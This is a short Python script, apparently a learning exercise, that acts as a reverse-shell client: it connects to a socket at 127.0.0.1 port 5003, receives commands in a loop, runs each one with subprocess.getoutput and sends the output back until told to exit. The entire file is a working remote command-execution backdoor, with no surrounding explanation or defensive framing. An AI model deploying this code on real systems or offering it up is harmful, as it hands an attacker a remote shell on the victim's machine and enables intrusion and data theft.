import socket
import subprocess
Host = "127.0.0.1"
Port=5003
Buffer=1024

s=socket.socket()
s.connect((Host,Port))

message = s.recv(Buffer).decode()
print("Server Says : ",message)

while True :
	command=s.recv(Buffer).decode()
	if command.lower()=='exit':
		break	
	output = subprocess.getoutput(command)
	s.send(output.encode())
s.close()
